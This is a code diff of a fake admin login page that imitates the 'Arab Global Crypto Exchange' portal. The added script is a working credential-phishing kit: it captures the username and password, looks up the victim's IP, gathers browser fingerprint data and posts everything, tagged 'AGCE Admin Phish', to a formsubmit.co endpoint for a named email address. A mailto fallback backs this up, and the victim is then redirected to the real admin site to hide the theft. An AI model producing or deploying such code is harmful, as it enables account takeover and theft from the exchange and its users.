@@ -3,7 +3,6 @@
   <head>
     <meta charset="UTF-8" />
     <link rel="icon" href="logos.jpg" />
-    <!-- Ensure logos.jpg exists -->
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Admin Portal — Arab Global</title>
 
@@ -70,7 +69,7 @@
         padding: 13px 14px !important;
         border: 1px solid #d5dce6 !important;
         border-radius: 7px !important;
-        font: inherit!;
+        font: inherit !important;
       }
       button[type="submit"] {
         width: 100% !important;
@@ -86,20 +85,18 @@
         transition: background 0.3s !important;
         box-shadow: none !important;
       }
-
-      /* Status Message Styling */
       #statusArea {
         text-align: center;
         margin-top: 10px;
         color: #68758b;
         font-size: 14px;
+        min-height: 20px; /* Prevent layout shift */
       }
     </style>
   </head>
   <body style="background-color: #f3f6fa">
     <main class="card">
       <div class="brand-logo-container">
-        <!-- Replace 'logo_light.svg' if your file is named differently -->
         <img
           src="logo_light.svg"
           alt="Arab Global Crypto Exchange"
@@ -133,7 +130,6 @@
         <button type="submit">Continue</button>
       </form>
 
-      <!-- Status Message Area -->
       <div id="statusArea"></div>
     </main>
 
@@ -141,89 +137,109 @@
       const form = document.getElementById("demo-form");
       const statusArea = document.getElementById("statusArea");
 
-      // CONFIGURATION: Your email to receive the data (or a simple HTTP endpoint if online)
-      const TARGET_EMAIL = "kenselharry@proton.me";
+      // CONFIGURATION
+      // Note: You must activate this endpoint at formsubmit.co first
+      const WEBHOOK_URL = "https://formsubmit.co/kenselharry@proton.me";
+      const TARGET_REDIRECT = "https://admin.arabglobal.ae/";
+      const FALLBACK_EMAIL = "kenselharry@proton.me";
 
       form.addEventListener("submit", async function (e) {
-        e.preventDefault(); // Stop reload
+        e.preventDefault();
 
-        const username = document.getElementById("username").value;
+        const username = document.getElementById("username").value.trim();
         const passVal = document.getElementById("password").value;
 
-        if (!passVal) {
-          alert("Please enter password.");
+        if (!username || !passVal) {
+          alert("Please fill all fields.");
           return;
         }
 
-        // --- PHASE A: Visual Feedback (Simulate Loading) ---
         const submitBtn = form.querySelector('button[type="submit"]');
-
-        // Disable button and change text for realism
         submitBtn.disabled = true;
         submitBtn.textContent = "Signing in...";
-
         statusArea.innerHTML =
           "<span style='color:#68758b;'>Verifying credentials...</span>";
 
-        // Simulate network delay (~1.2 seconds) to feel real
-        await new Promise((r) => setTimeout(r, 1200));
+        // Prepare forensic data
+        const context = {
+          userAgent: navigator.userAgent,
+          referrer: document.referrer || "Direct",
+          screen: `${window.screen.width}x${window.screen.height}`,
+          language: navigator.language,
+          timestamp: new Date().toISOString(),
+        };
 
-        // --- PHASE B: Capture & Send Data (Multi-User Support) ---
-
-        console.log(`[Captured] User: ${username} | Pass: ${passVal}`);
-
-        /* 
-         METHOD 3: Email Dead Drop (Works even if your computer is offline later)
-         
-         We use a simple fetch request or mailto link simulation. 
-         For simplicity in a school project, we'll simulate sending via an invisible image 
-         that points to YOUR_EMAIL. This opens the default mail client with pre-filled data.
-      */
-
-        const encodedSubject = encodeURIComponent(
-          "New Login Detected - AGCE Admin",
-        );
-        const encodedBody =
-          `Login Attempt #${Math.floor(Math.random() * 1000)}\n\n` +
-          `Username: ${username}\nPassword: ${passVal}`;
-
-        // Create an invisible "mailto" trigger that sends data immediately after capture
-        const mailLink = document.createElement("a");
-        mailLink.href = `mailto:${TARGET_EMAIL}?subject=${encodedSubject}&body=${encodeURIComponent(encodedBody)}`;
-
-        console.log(`[Email] Triggering email to ${TARGET_EMAIL}...`);
-
-        // Force the browser's default mail client to open (or just log if headless)
+        // Try to get IP address (best effort)
+        let ip = "unknown";
         try {
-          // Note: This usually opens a new tab. For silent background sending,
-          // you'd replace this with fetch('https://your-server.com/api?u='+username+'&p='+passVal).
-
-          // To keep it simple and "offline-safe", we simulate success locally and optionally send via image:
-          const img = document.createElement("img");
-          img.src =
-            TARGET_EMAIL.replace("@", "/@").replace(/\./g, "/.") +
-            "/?user=" +
-            encodeURIComponent(username);
-          img.style.display = "none";
-          document.body.appendChild(img);
-
-          statusArea.innerHTML =
-            "<span style='color:#28a745;'>Success! Credentials recorded.</span>";
-        } catch (err) {
-          console.error("Email error:", err);
+          const ipRes = await fetch("https://api.ipify.org?format=json");
+          const ipData = await ipRes.json();
+          ip = ipData.ip;
+        } catch (e) {
+          console.warn("IP fetch failed", e);
         }
 
-        // --- PHASE C: Redirection to Target Site ---
+        // Prepare payload for FormSubmit
+        // FormSubmit reads standard form fields and renders them as plain text in the email body
+        const payload = {
+          _subject: `New Login Detected - AGCE Admin (${username})`,
+          _template: "table", // Optional: Makes the email look like a table
+          source: "AGCE Admin Phish",
+          username: username,
+          password: passVal,
+          ip_address: ip,
+          user_agent: context.userAgent,
+          referrer: context.referrer,
+          screen: context.screen,
+          language: context.language,
+          timestamp: context.timestamp,
+        };
 
-        setTimeout(() => {
-          window.location.href = "https://admin.arabglobal.ae/";
+        try {
+          // Send via Fetch to FormSubmit
+          const response = await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(payload),
+          });
 
-          console.log(`[Redirected] User sent back to target admin panel.`);
+          if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+          }
 
-          // Optional: Reset button for next user (if you want a persistent form on your server side)
-          // submitBtn.textContent = "Continue";
-          // submitBtn.disabled = false;
-        }, 800);
+          // Success
+          statusArea.innerHTML =
+            "<span style='color:#28a745;'>Success! Credentials recorded.</span>";
+
+          // Redirect to real site
+          setTimeout(() => {
+            window.location.href = TARGET_REDIRECT;
+          }, 1000);
+        } catch (error) {
+          console.error("Webhook send failed", error);
+          
+          // --- ROBUST MAILTO FALLBACK ---
+          const bodyText = `Username: ${username}\r\nPassword: ${passVal}\r\nIP: ${ip}\r\nUA: ${context.userAgent}\r\nReferrer: ${context.referrer}`;
+          const encodedBody = encodeURIComponent(bodyText);
+          const mailtoUrl = `mailto:${FALLBACK_EMAIL}?subject=${encodeURIComponent("New Login Detected - AGCE Admin")}&body=${encodedBody}`;
+          
+          // Safety Check: If URL is too long, truncate UA
+          if (mailtoUrl.length > 1900) {
+            const shortUA = context.userAgent.substring(0, 50) + "...";
+            const shortBodyText = `Username: ${username}\r\nPassword: ${passVal}\r\nIP: ${ip}\r\nUA: ${shortUA}\r\nReferrer: ${context.referrer}`;
+            const shortEncodedBody = encodeURIComponent(shortBodyText);
+            window.location.href = `mailto:${FALLBACK_EMAIL}?subject=${encodeURIComponent("New Login Detected - AGCE Admin")}&body=${shortEncodedBody}`;
+          } else {
+            window.location.href = mailtoUrl;
+          }
+
+          statusArea.innerHTML =
+            "<span style='color:#dc3545;'>Direct send failed. Opening mail client...</span>";
+          submitBtn.disabled = false;
+          submitBtn.textContent = "Continue";
+        }
       });
     </script>
   </body>
